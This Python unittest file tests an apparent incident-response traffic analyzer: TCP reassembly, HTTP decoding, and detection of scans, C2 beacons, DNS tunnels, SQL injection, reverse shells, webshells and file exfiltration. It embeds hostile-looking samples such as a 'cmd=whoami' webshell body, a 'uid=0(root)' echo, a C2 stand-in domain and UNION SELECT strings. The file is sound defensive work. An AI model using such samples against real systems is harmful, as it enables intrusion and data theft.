        http = [e for e in evs if e.action == A_HTTP_REQUEST
                and e.detail["direction"] == "request"][0]
        self.assertEqual(http.method, "GET")
        self.assertIn("UNION%20SELECT", http.uri)     # 原始路径保留 URL 编码
        self.assertIn("sqlmap", http.user_agent)

        tls = [e for e in evs if e.action == A_NET_TLS][0]
        self.assertEqual(tls.domain, "evil-c2.example.net")
        self.assertEqual(len(tls.hashes), 32)          # JA3 为 md5

        cred = [e for e in evs if e.action == A_NET_CRED]
        self.assertTrue(any(e.detail["cred_protocol"] == "FTP" for e in cred))

    def test_pcapng_and_pcap_both_parse(self):
        """两种封装格式都必须产出事件（pcapng 块长度含尾部 4 字节，易读错）。"""
        self.assertGreater(len(self._events("traffic_scan_c2.pcap")), 50)
        self.assertGreater(len(self._events("traffic_dns_web.pcapng")), 50)

    def test_gzip_pcap_supported(self):
        import gzip
        import shutil
        tmp = os.path.join(tempfile.mkdtemp(), "t.pcap.gz")
        with open(fx("traffic_benign.pcap"), "rb") as src, gzip.open(tmp, "wb") as dst:
            shutil.copyfileobj(src, dst)
        self.assertEqual(detect_parser(tmp).name, "pcap")
        self.assertGreater(len(list(iter_events(tmp))), 0)

    def test_truncated_file_no_crash(self):
        """截断的流量包必须优雅结束，不能抛异常。"""
        tmp = os.path.join(tempfile.mkdtemp(), "broken.pcap")
        with open(fx("traffic_scan_c2.pcap"), "rb") as src:
            data = src.read(500)
        with open(tmp, "wb") as f:
            f.write(data)
        evs = list(iter_events(tmp))
        self.assertIsInstance(evs, list)


class TestNetAnomaly(unittest.TestCase):
    """流量异常检测：扫描 / 信标 / DNS / 明文凭据 / 外传，以及误报边界。"""

    def _run(self, names, **overrides):
        cfg = Config()
        for k, v in overrides.items():
            setattr(cfg, k, v)
        return run_analysis([fx(n) for n in names], cfg)

    def _of(self, result, keyword: str) -> list:
        return [a for a in result.alerts
                if a.rule_id == "net-anomaly" and keyword in a.description]

    def test_port_and_host_scan(self):
        r = self._run(["traffic_scan_c2.pcap"])
        self.assertTrue(self._of(r, "端口扫描"), str([a.description for a in r.alerts]))
        self.assertTrue(self._of(r, "横向扫描"))
        scan = self._of(r, "端口扫描")[0]
        self.assertGreaterEqual(scan.entities["distinct_ports"], 20)

    def test_beacon_detected(self):
        """10 次 60s 等间隔连接应判为 C2 心跳（紧急）。"""
        r = self._run(["traffic_scan_c2.pcap"])
        beacon = self._of(r, "C2 心跳信标")
        self.assertTrue(beacon, str([a.description for a in r.alerts]))
        self.assertEqual(beacon[0].severity, 1)
        self.assertAlmostEqual(beacon[0].entities["mean_interval_sec"], 60.0, delta=1.0)

    def test_exfil_detected(self):
        r = self._run(["traffic_scan_c2.pcap"])
        ex = self._of(r, "可疑外传")
        self.assertTrue(ex, str([a.description for a in r.alerts]))
        self.assertEqual(ex[0].entities["dst_ip"], "203.0.113.77")

    def test_dns_dga_and_tunnel(self):
        r = self._run(["traffic_dns_web.pcapng"])
        self.assertTrue(self._of(r, "NXDOMAIN"))
        self.assertTrue(self._of(r, "DNS 隧道"))
        dga = self._of(r, "NXDOMAIN")[0]
        self.assertEqual(dga.entities["src_ip"], "10.0.0.7")   # 归属到查询方而非服务器

    def test_cleartext_credentials(self):
        r = self._run(["traffic_dns_web.pcapng"])
        cred = self._of(r, "明文凭据")
        self.assertTrue(cred)
        self.assertEqual(cred[0].entities["protocol"], "FTP")

    def test_benign_traffic_no_alert(self):
        """正常流量零告警（防误报底线）。"""
        r = self._run(["traffic_benign.pcap"])
        self.assertEqual([a for a in r.alerts if a.rule_id == "net-anomaly"], [],
                         str([a.description for a in r.alerts]))

    def test_scan_threshold_configurable(self):
        r = self._run(["traffic_scan_c2.pcap"], net_scan_ports=999)
        self.assertFalse(self._of(r, "端口扫描"))


class TestStreamReassembly(unittest.TestCase):
    """TCP 重组器单元测试：拼接语义与内存上限。"""

    def _r(self, **kw):
        from irlog.parsers.tcpstream import TCPStreamReassembler
        return TCPStreamReassembler(**kw)

    def test_in_order(self):
        r = self._r()
        r.feed(0.9, "10.0.0.1", 1000, "10.0.0.2", 80, 100, b"", 0x02)   # SYN
        self.assertIsNone(r.feed(1.0, "10.0.0.1", 1000, "10.0.0.2", 80, 101, b"AAA", 0x18))
        self.assertIsNone(r.feed(1.1, "10.0.0.1", 1000, "10.0.0.2", 80, 104, b"BBB", 0x18))
        s = r.finish().__next__()
        self.assertEqual(s["client_data"], b"AAABBB")
        self.assertEqual(s["client_len"], 6)
        self.assertEqual(s["src"], "10.0.0.1")       # 键左侧即客户端
        self.assertEqual(s["dport"], 80)

    def test_out_of_order(self):
        """乱序到达：后一段先到，缺口补齐后仍按序还原（依赖握手指纹定基）。"""
        r = self._r()
        r.feed(0.9, "10.0.0.1", 1000, "10.0.0.2", 80, 100, b"", 0x02)
        r.feed(1.0, "10.0.0.1", 1000, "10.0.0.2", 80, 104, b"BBB", 0x18)
        r.feed(1.1, "10.0.0.1", 1000, "10.0.0.2", 80, 101, b"AAA", 0x18)
        s = r.finish().__next__()
        self.assertEqual(s["client_data"], b"AAABBB")
        self.assertEqual(s["out_of_order"], 1)

    def test_retransmit_not_duplicated(self):
        """重传段不得被拼接两次。"""
        r = self._r()
        r.feed(1.0, "10.0.0.1", 1000, "10.0.0.2", 80, 100, b"AAA", 0x18)
        r.feed(1.1, "10.0.0.1", 1000, "10.0.0.2", 80, 100, b"AAA", 0x18)
        s = r.finish().__next__()
        self.assertEqual(s["client_data"], b"AAA")
        self.assertEqual(s["retransmits"], 1)

    def test_overlap_appends_only_new_bytes(self):
        """部分重叠：只补尾部新数据。"""
        r = self._r()
        r.feed(1.0, "10.0.0.1", 1000, "10.0.0.2", 80, 100, b"AAAA", 0x18)
        r.feed(1.1, "10.0.0.1", 1000, "10.0.0.2", 80, 102, b"AA", 0x18)
        s = r.finish().__next__()
        self.assertEqual(s["client_data"], b"AAAA")

    def test_missing_handshake_still_reassembles(self):
        """抓包缺握手时，以首个数据段为基准顺序拼接（并标记非 SYN 定基）。"""
        r = self._r()
        r.feed(1.0, "10.0.0.1", 1000, "10.0.0.2", 80, 500, b"AAA", 0x18)
        r.feed(1.1, "10.0.0.1", 1000, "10.0.0.2", 80, 503, b"BBB", 0x18)
        s = r.finish().__next__()
        self.assertEqual(s["client_data"], b"AAABBB")

    def test_untrusted_base_falls_back_to_ordered_segments(self):
        """基准不可信（SYN 与数据不属于同一连接）时，按偏移尽力拼接并标记。"""
        r = self._r()
        r.feed(0.9, "10.0.0.1", 1000, "10.0.0.2", 80, 100, b"", 0x02)
        r.feed(1.0, "10.0.0.1", 1000, "10.0.0.2", 80, 5000, b"CCC", 0x18)
        r.feed(1.1, "10.0.0.1", 1000, "10.0.0.2", 80, 5003, b"DDD", 0x18)
        s = r.finish().__next__()
        self.assertEqual(s["client_data"], b"CCCDDD")   # 两段彼此连续，按偏移拼出
        self.assertTrue(s["partial"])                   # 但整体相对 SYN 缺一大段

    def test_seq_wraparound(self):
        """32 位序列号回绕。"""
        r = self._r()
        base = 0xFFFFFFF0
        r.feed(1.0, "10.0.0.1", 1000, "10.0.0.2", 80, base, b"AAAAAAAAAAAAAAAA", 0x18)
        nxt = (base + 16) & 0xFFFFFFFF          # 回绕到 0x00000000
        r.feed(1.1, "10.0.0.1", 1000, "10.0.0.2", 80, nxt, b"BBBB", 0x18)
        s = r.finish().__next__()
        self.assertEqual(s["client_data"], b"AAAAAAAAAAAAAAAABBBB")

    def test_bidirectional(self):
        """双向分别重组，且正反方向归为同一条流。"""
        r = self._r()
        r.feed(1.0, "10.0.0.1", 1000, "10.0.0.2", 80, 100, b"REQ", 0x18)
        r.feed(1.1, "10.0.0.2", 80, "10.0.0.1", 1000, 900, b"RESP", 0x18)
        s = r.finish().__next__()
        self.assertEqual(s["client_data"], b"REQ")
        self.assertEqual(s["server_data"], b"RESP")
        self.assertEqual(s["packets"], 2)

    def test_fin_flushes_stream(self):
        """双向 FIN 后流即完成（不等抓包结束）。"""
        r = self._r()
        r.feed(1.0, "10.0.0.1", 1000, "10.0.0.2", 80, 100, b"REQ", 0x18)
        self.assertIsNone(r.feed(1.1, "10.0.0.2", 80, "10.0.0.1", 1000, 900, b"RESP", 0x11))
        s = r.feed(1.2, "10.0.0.1", 1000, "10.0.0.2", 80, 103, b"", 0x11)
        self.assertIsNotNone(s)
        self.assertTrue(s["complete"])
        self.assertEqual(s["client_data"], b"REQ")
        self.assertEqual(s["server_data"], b"RESP")

    def test_byte_cap_truncates(self):
        """每方向字节上限：达到即截断并立刻吐出，不等 FIN。"""
        r = self._r(max_bytes=8)
        s = r.feed(1.0, "10.0.0.1", 1000, "10.0.0.2", 80, 100, b"X" * 20, 0x18)
        self.assertIsNotNone(s)
        self.assertTrue(s["truncated"])

    def test_stream_cap_evicts_oldest(self):
        """并发流上限：淘汰最久未更新的流，且新流仍要被正确记录。"""
        r = self._r(max_streams=1)
        r.feed(1.0, "10.0.0.1", 1000, "10.0.0.2", 80, 100, b"A", 0x18)
        evicted = r.feed(2.0, "10.0.0.3", 1000, "10.0.0.4", 80, 100, b"B", 0x18)
        self.assertIsNotNone(evicted)
        self.assertEqual(evicted["client_data"], b"A")
        self.assertEqual(len(r.streams), 1)              # 新流已建立，未被丢弃
        rest = list(r.finish())
        self.assertEqual([x["client_data"] for x in rest], [b"B"])

    def test_no_payload_no_stream(self):
        """纯握手不占流槽位（SYN Flood 不会撑爆流表）。"""
        r = self._r()
        for i in range(100):
            r.feed(1.0, "10.0.0.1", 1000 + i, "10.0.0.2", 80, 100, b"", 0x02)
        self.assertEqual(len(r.streams), 0)
        self.assertGreater(len(r.isn), 0)                # 指纹已记录

    def test_drain_returns_extra_flushed_streams(self):
        """淘汰与新流同时完成时，多余的结果也不能丢。"""
        r = self._r(max_streams=1, max_bytes=4)
        r.feed(1.0, "10.0.0.1", 1000, "10.0.0.2", 80, 100, b"AA", 0x18)   # 未达上限，留在表里
        got = r.feed(2.0, "10.0.0.3", 1000, "10.0.0.4", 80, 100, b"BBBBB", 0x18)
        extra = list(r.drain())
        alls = ([got] if got else []) + extra
        self.assertEqual(sorted(x["client_data"] for x in alls), [b"AA", b"BBBBB"])


class TestStreamContent(unittest.TestCase):
    """重组流内容检测：跨报文才能看到的证据。"""

    def _events(self, name="traffic_stream.pcap") -> list:
        return list(iter_events(fx(name)))

    def _run(self, names=None, **cfg_kw):
        return run_analysis([fx(n) for n in (names or ["traffic_stream.pcap"])],
                            Config(**cfg_kw))

    def test_stream_events_emitted(self):
        from irlog.models import A_NET_STREAM
        evs = [e for e in self._events() if e.action == A_NET_STREAM]
        self.assertGreaterEqual(len(evs), 5)

    def test_out_of_order_and_retransmit_reassembled(self):
        """乱序 + 重传后，POST 请求行与请求体必须拼成完整内容。"""
        from irlog.models import A_NET_STREAM
        evs = [e for e in self._events() if e.action == A_NET_STREAM]
        post = [e for e in evs if e.detail.get("dst_port") == 80
                and "POST /login" in (e.detail.get("client_text") or "")]
        self.assertEqual(len(post), 1)
        d = post[0].detail
        self.assertIn("UNION%20SELECT", d["client_text"])
        self.assertEqual(d["out_of_order"], 1)
        self.assertEqual(d["retransmits"], 1)
        # 重传不得让字节数虚高：请求行+请求体，不含重复的 body1
        self.assertEqual(d["client_bytes"], len(d["client_text"].encode("utf-8", "replace")))

    def test_http_body_detected_as_sqli(self):
        """POST 请求体里的注入：URI 干净，只有重组后才查得到。"""
        from irlog.models import A_HTTP_REQUEST
        evs = [e for e in self._events()
               if e.action == A_HTTP_REQUEST and e.detail.get("http_body")]
        self.assertTrue(evs, "未产出 HTTP 请求体事件")
        body_ev = evs[0]
        self.assertEqual(body_ev.uri, None)        # 避免与单包事件重复计数
        self.assertIn("UNION%20SELECT", body_ev.detail["http_body"])

        r = self._run()
        sqli = [a for a in r.alerts if a.rule_id == "web-attack"
                and "SQL注入" in a.description]
        self.assertTrue(sqli, str([a.description for a in r.alerts]))

    def test_reverse_shell_detected(self):
        r = self._run()
        hits = [a for a in r.alerts if a.rule_id == "stream-content"
                and "反向 shell" in a.description]
        self.assertTrue(hits, str([a.description for a in r.alerts]))
        self.assertEqual(hits[0].severity, 1)
        self.assertEqual(hits[0].entities["dst_ip"], "203.0.113.9")

    def test_credential_pair_across_packets(self):
        """用户名与口令分属两个报文 → 配成完整凭据对，且报告里口令脱敏。"""
        r = self._run()
        hits = [a for a in r.alerts if a.rule_id == "stream-content"
                and "凭据对" in a.description]
        self.assertTrue(hits, str([a.description for a in r.alerts]))
        desc = hits[0].description
        self.assertIn("admin", desc)
        self.assertNotIn("S3cret!2024", desc)      # 明文口令不得落进报告

    def test_sensitive_file_exfiltration(self):
        r = self._run()
        hits = [a for a in r.alerts if a.rule_id == "stream-content"
                and "/etc/passwd" in a.description]
        self.assertTrue(hits, str([a.description for a in r.alerts]))
        self.assertEqual(hits[0].severity, 1)

    def test_encoded_payload_in_stream(self):
        r = self._run()
        hits = [a for a in r.alerts if a.rule_id == "stream-content"
                and "解码" in a.description]
        self.assertTrue(hits, str([a.description for a in r.alerts]))

    def test_benign_stream_no_alert(self):
        """正常 HTTP 会话不得触发流内容告警。"""
        r = self._run()
        benign = [a for a in r.alerts
                  if a.rule_id == "stream-content"
                  and a.entities.get("src_ip") == "10.0.0.60"]
        self.assertEqual(benign, [], str([a.description for a in r.alerts]))

    def test_rule_can_be_disabled(self):
        r = self._run(rules="brute-force")
        self.assertEqual([a for a in r.alerts if a.rule_id == "stream-content"], [])


class TestHttpProto(unittest.TestCase):
    """HTTP 应用层解码：请求/响应切分、chunked、内容编码。"""

    def _msgs(self, buf: bytes, kind: str) -> list:
        from irlog.parsers.httpproto import iter_http_messages
        return list(iter_http_messages(buf, kind))

    def test_request_body(self):
        req = (b"POST /login HTTP/1.1\r\nHost: a.example.com\r\n"
               b"Content-Length: 10\r\n\r\ncmd=whoami")
        m = self._msgs(req, "request")
        self.assertEqual(len(m), 1)
        self.assertEqual(m[0]["method"], "POST")
        self.assertEqual(m[0]["content"], b"cmd=whoami")
        self.assertTrue(m[0]["complete"])

    def test_chunked_response(self):
        body = b"uid=0(root) gid=0(root)\n"
        chunks = (b"%x\r\n" % len(body)) + body + b"\r\n0\r\n\r\n"
        resp = (b"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n"
                b"Transfer-Encoding: chunked\r\n\r\n" + chunks)
        m = self._msgs(resp, "response")
        self.assertEqual(len(m), 1)
        self.assertEqual(m[0]["status"], 200)
        self.assertEqual(m[0]["content"], body)
        self.assertIn("chunked", m[0]["encoding"])

    def test_gzip_response(self):
        import gzip
        raw = b"-----BEGIN RSA PRIVATE KEY-----\nAAA\n"
        packed = gzip.compress(raw)
        resp = (b"HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n"
                b"Content-Encoding: gzip\r\nContent-Length: %d\r\n\r\n" % len(packed)) + packed
        m = self._msgs(resp, "response")
        self.assertEqual(m[0]["content"], raw)
        self.assertIn("gzip", m[0]["encoding"])

    def test_keepalive_multiple_requests(self):
        """一条长连接上的多条请求必须被逐条切分（否则后面的攻击载荷全丢）。"""
        buf = (b"GET /a HTTP/1.1\r\nHost: h\r\n\r\n"
               b"GET /b HTTP/1.1\r\nHost: h\r\n\r\n"
               b"POST /c HTTP/1.1\r\nHost: h\r\nContent-Length: 5\r\n\r\nx=1' "
               b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nok")
        m = self._msgs(buf, "request")
        # Host 头自动补齐为完整 URL（与 Web 访问日志同一口径）
        self.assertEqual([x["uri"] for x in m],
                         ["http://h/a", "http://h/b", "http://h/c"])
        self.assertEqual(m[2]["content"], b"x=1' ")

    def test_multiple_responses(self):
        buf = (b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nok"
               b"HTTP/1.1 404 Not Found\r\nContent-Length: 3\r\n\r\nnop")
        m = self._msgs(buf, "response")
        self.assertEqual([x["status"] for x in m], [200, 404])

    def test_truncated_body_marked(self):
        """声明长度大于实际抓到的字节：标记截断而不是静默丢失。"""
        resp = b"HTTP/1.1 200 OK\r\nContent-Length: 500\r\n\r\nonly-10"
        m = self._msgs(resp, "response")
        self.assertTrue(m[0]["truncated"])
        self.assertEqual(m[0]["content"], b"only-10")

    def test_request_line_not_mistaken_for_response(self):
        """请求行尾部的 HTTP/1.1 不能被当成响应起始行（会把请求解析成响应）。"""
        m = self._msgs(b"GET /index.html HTTP/1.1\r\nHost: h\r\n\r\n", "response")
        self.assertEqual(m, [])

    def test_binary_body(self):
        from irlog.parsers.httpproto import to_text, magic_label
        png = b"\x89PNG\r\n\x1a\n" + b"\x00" * 40
        text, binary = to_text(png)
        self.assertTrue(binary)
        self.assertEqual(magic_label(b"MZ\x90\x00abc"), "Windows 可执行文件（PE/DOS 头 MZ）")

    def test_garbage_buffer_yields_nothing(self):
        self.assertEqual(self._msgs(b"\x16\x03\x01\x00\xf0\x01", "request"), [])
        self.assertEqual(self._msgs(b"", "response"), [])


class TestHttpContent(unittest.TestCase):
    """HTTP 请求体/响应体检测：命令回显、外传内容、上传木马、脚本下载。"""

    def _run(self, names, **overrides):
        cfg = Config()
        for k, v in overrides.items():
            setattr(cfg, k, v)
        return run_analysis([fx(n) for n in names], cfg)

    def _of(self, result, keyword: str, rule: str = "http-content") -> list:
        return [a for a in result.alerts
                if a.rule_id == rule and keyword in a.description]

    def test_webshell_command_echo(self):
        """POST 到上传目录 php + 响应体回显 uid=0(root) → 确认被打穿。"""
        r = self._run(["traffic_http.pcap"])
        hits = self._of(r, "命令执行回显")
        self.assertTrue(hits, str([a.description for a in r.alerts]))
        self.assertEqual(hits[0].severity, 1)
        self.assertEqual(hits[0].entities["src_ip"], "10.0.0.40")
        # 同一条会话还应被 webshell 规则命中（请求体里的系统命令）
        self.assertTrue(self._of(r, "Webshell", rule="webshell"),
                        str([a.description for a in r.alerts]))

    def test_sensitive_file_download(self):
        r = self._run(["traffic_http.pcap"])
        hits = self._of(r, "敏感内容")
        self.assertTrue(hits, str([a.description for a in r.alerts]))
        self.assertEqual(hits[0].severity, 1)
        self.assertTrue(any("/etc/passwd" in a.description for a in hits))

    def test_gzip_body_decoded(self):
        """gzip 压缩的私钥：不解压就是乱码，必须解码后才命中。"""
        r = self._run(["traffic_http.pcap"])
        self.assertTrue(self._of(r, "私钥"), str([a.description for a in r.alerts]))

    def test_upload_webshell(self):
        r = self._run(["traffic_http.pcap"])
        hits = self._of(r, "上传可疑脚本文件")
        self.assertTrue(hits, str([a.description for a in r.alerts]))
        self.assertEqual(hits[0].severity, 1)
        self.assertEqual(hits[0].entities["src_ip"], "203.0.113.61")
        self.assertTrue(self._of(r, "一句话木马"))

    def test_post_body_injection_via_web_attack(self):
        """长连接第 3 个请求的注入载荷只在请求体里。"""
        r = self._run(["traffic_http.pcap"])
        hits = [a for a in r.alerts if a.rule_id == "web-attack"
                and a.entities.get("src_ip") == "203.0.113.62"]
        self.assertTrue(hits, str([a.description for a in r.alerts]))
        self.assertIn("SQL注入", hits[0].entities["attack_type"])

    def test_script_download(self):
        r = self._run(["traffic_http.pcap"])
        hits = self._of(r, "下载执行类脚本")
        self.assertTrue(hits, str([a.description for a in r.alerts]))
        self.assertEqual(hits[0].entities["src_ip"], "10.0.0.43")

    def test_client_side_from_syn_not_ip_order(self):
        """外网 IP 连内网服务器时，客户端方向必须按 SYN 判定（不能按 IP 字典序）。"""
        from irlog.models import A_HTTP_REQUEST
        evs = [e for e in iter_events(fx("traffic_http.pcap"))
               if e.action == A_HTTP_REQUEST and e.detail.get("http_body")
               and e.detail.get("direction") == "request"]
        up = [e for e in evs if e.src_ip == "203.0.113.61"]
        self.assertTrue(up, str([(e.src_ip, e.dst_ip) for e in evs]))
        self.assertEqual(up[0].dst_ip, "10.0.0.80")     # 服务器在右侧

    def test_benign_http_no_alert(self):
        """正常页面请求响应不得触发 HTTP 内容告警（防误报底线）。"""
        r = self._run(["traffic_http.pcap"])
        benign = [a for a in r.alerts if a.rule_id == "http-content"
                  and a.entities.get("src_ip") == "10.0.0.44"]
        self.assertEqual(benign, [], str([a.description for a in r.alerts]))
        r2 = self._run(["traffic_benign.pcap"])
        self.assertEqual([a for a in r2.alerts if a.rule_id == "http-content"], [])

    def test_rule_can_be_disabled(self):
        r = self._run(["traffic_http.pcap"], rules="brute-force")
        self.assertEqual([a for a in r.alerts if a.rule_id == "http-content"], [])


class TestRespondKB(unittest.TestCase):
    """处置知识库自检：覆盖度、阶段齐整、占位符合法。"""

    def test_every_rule_covered(self):
        from irlog.detectors import ALL_DETECTORS
        ids = {d.rule_id for d in ALL_DETECTORS}
        self.assertEqual(ids - set(PLAYBOOKS), set(),
                         f"缺少剧本的规则: {ids - set(PLAYBOOKS)}")

    def test_every_platform_has_all_stages(self):
        for rule, plats in PLAYBOOKS.items():
            for plat, stages in plats.items():
                for key, _l, _h in STAGES:
                    self.assertTrue(stages.get(key),
                                    f"{rule}/{plat} 缺阶段 {key}")
                    self.assertTrue(all(c.get("cmd") for c in stages[key]),
                                    f"{rule}/{plat}/{key} 有空命令")

    def test_no_placeholder_in_note(self):
        """note 不参与回填，里面不能出现占位符（否则用户看到 {ip} 原文）。"""
        for rule, plats in PLAYBOOKS.items():
            for plat, stages in plats.items():
                for key, cmds in stages.items():
                    for c in cmds:
                        for ph in PLACEHOLDERS:
                            self.assertNotIn("{%s}" % ph, c.get("note", ""),
                                             f"{rule}/{plat}/{key} note 含占位符")


class TestPlaybookRender(unittest.TestCase):
    """剧本渲染：实体回填、阶段顺序、报告与手册产出。"""

    @classmethod
    def setUpClass(cls):
        cls.result = run_analysis([fx("winsec_security.xml"), fx("traffic_stream.pcap")])

    def test_alerts_have_stages(self):
        self.assertTrue(self.result.alerts)
        for a in self.result.alerts:
            pb = a.playbook
            self.assertTrue(pb.get("stages"), f"{a.rule_id} 无阶段")
            keys = [s["key"] for s in pb["stages"]]
            self.assertEqual(keys, [k for k, _l, _h in STAGES if k in keys])

    def test_no_leftover_known_placeholder(self):
        for a in self.result.alerts:
            for st in a.playbook.get("stages", []):
                for c in st["cmds"]:
                    for ph in PLACEHOLDERS:
                        self.assertNotIn("{%s}" % ph, c["cmd"],
                                         f"{a.rule_id} 未回填 {ph}: {c['cmd'][:60]}")

    def test_ip_filled_when_entity_present(self):
        for a in self.result.alerts:
            ip = a.entities.get("src_ip") or a.entities.get("dst_ip")
            if not ip:
                continue
            joined = " ".join(c["cmd"] for s in a.playbook.get("stages", [])
                              for c in s["cmds"])
            self.assertIn(ip, joined, f"{a.rule_id} 有 IP 实体但未回填")

    def test_host_not_filled_with_filename(self):
        """主机名不得被填成证据文件名（brute-force 曾把 source 当 host）。"""
        for a in self.result.alerts:
            for s in a.playbook.get("stages", []):
                for c in s["cmds"]:
                    self.assertNotRegex(c["cmd"], r"fixtures?[\\/][^\s]*\.(xml|pcap|log|jsonl)")

    def test_vars_from_evidence(self):
        """实体缺失时，应从 reasons/证据原文回补 IP 与主机名。"""
        r = run_analysis([fx("sysmon_obfuscated.xml")])
        cand = [x for x in r.alerts if x.rule_id == "command-obfuscation"]
        self.assertTrue(cand, "夹具应触发命令混淆告警")
        v = extract_vars(cand[0])
        self.assertTrue(v.get("ip"), "应从 reasons 里的 URL 提取到 IP")
        self.assertTrue(v.get("host"), "应取到主机名")

    def test_path_like_rejected(self):
        from irlog.respond import _is_path_like
        self.assertTrue(_is_path_like("tests/fixtures/x.xml"))
        self.assertTrue(_is_path_like(None))
        self.assertFalse(_is_path_like("WKST05.corp.local"))

    def test_playbook_markdown(self):
        md = playbook_markdown(self.result)
        for _k, label, _h in STAGES:
            self.assertIn(label, md)
        self.assertIn("应急响应处置手册", md)
        self.assertIn("```bash", md)

    def test_playbook_html(self):
        custody = {"case_id": "TEST-1", "operator": "tester"}
        html = build_playbook_html(self.result, custody)
        self.assertIn("应急响应处置手册", html)
        self.assertIn("copyCmd", html)
        self.assertIn("紧急", html)
        # 所有命令都做了 HTML 转义（不能出现未转义的 < 开头标签残留）
        self.assertNotIn("<script>alert", html)


class TestMainReportWithPlaybook(unittest.TestCase):
    """主报告也要内嵌剧本。"""

    def test_html_report_contains_playbook(self):
        r = run_analysis([fx("traffic_stream.pcap")])
        custody = {"case_id": "TEST-2", "operator": "tester",
                   "evidence": {"items": []}, "evidence_integrity": ""}
        html = build_html(r, custody)
        self.assertIn("应急响应处置剧本", html)
        self.assertIn("copyCmd", html)


if __name__ == "__main__":
    unittest.main(verbosity=2)
